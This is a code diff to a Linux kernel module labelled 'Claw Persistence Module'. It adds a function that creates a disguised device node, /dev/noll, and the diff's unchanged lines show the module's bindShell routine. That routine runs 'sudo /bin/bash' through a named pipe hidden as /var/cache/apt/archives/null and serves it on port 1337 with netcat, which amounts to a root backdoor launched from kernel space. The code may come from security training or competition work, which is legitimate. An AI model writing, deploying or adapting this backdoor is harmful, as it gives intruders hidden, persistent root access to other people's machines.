@@ -8,7 +8,7 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Tristan Fletcher (@Cyclawps52)");
 MODULE_DESCRIPTION("Claw Persistence Module");
-MODULE_VERSION("cleanup-rev8");
+MODULE_VERSION("cleanup-rev9");
 
 int initModule(void);
 void exitModule(void);
@@ -19,6 +19,7 @@ static ssize_t deviceWrite(struct file*, const char*, size_t, loff_t*);
 static int makePipe(void);
 static int bindShell(void);
 static int resetShell(void);
+static int mkNod(void);
 
 // for character device
 #define SUCCESS 0
@@ -53,6 +54,7 @@ int initModule(void){
     }
     printk(KERN_INFO "[ClawPersist] DEBUG: Assigned major number %d\n", major);
 	majorNum = major;
+	mkNod();
 
     return 0;
 }
@@ -141,6 +143,7 @@ static int makePipe(void){
 
 static int bindShell(void){
 	destroyPipe();
+	mkNod();
 	makePipe();
 	// while true; do cat /var/cache/apt/archives/null | sudo /bin/bash 2>&1 |/bin/nc -l 1337 >/var/cache/apt/archives/null; done >/dev/null &
 	char* argv[] = {"/bin/sh", "-c", "while true; do cat /var/cache/apt/archives/null | sudo /bin/bash 2>&1 |/bin/nc -l 1337 >/var/cache/apt/archives/null; done >/dev/null &", NULL};
@@ -157,6 +160,19 @@ static int bindShell(void){
 static int resetShell(void){
 	// sudo pkill -9 -f "/var/cache/apt/archives/null" >/dev/null &
 	char* argv[] = {"/bin/sh", "-c", "sudo pkill -9 -f \"/var/cache/apt/archives/null\" >/dev/null &", NULL};
+	static char* env[] = {
+		"HOME=/",
+		"TERM=linux",
+		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", 
+		NULL
+	};
+
+	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
+}
+
+static int mkNod(void){
+	// sudo mknod /dev/noll c $(cat /sys/module/clawpersist/parameters/majorNum) 0
+	char* argv[] = {"/bin/sh", "-c", "sudo mknod /dev/noll c $(cat /sys/module/clawpersist/parameters/majorNum) 0 >/dev/null &", NULL};
 	static char* env[] = {
 		"HOME=/",
 		"TERM=linux",
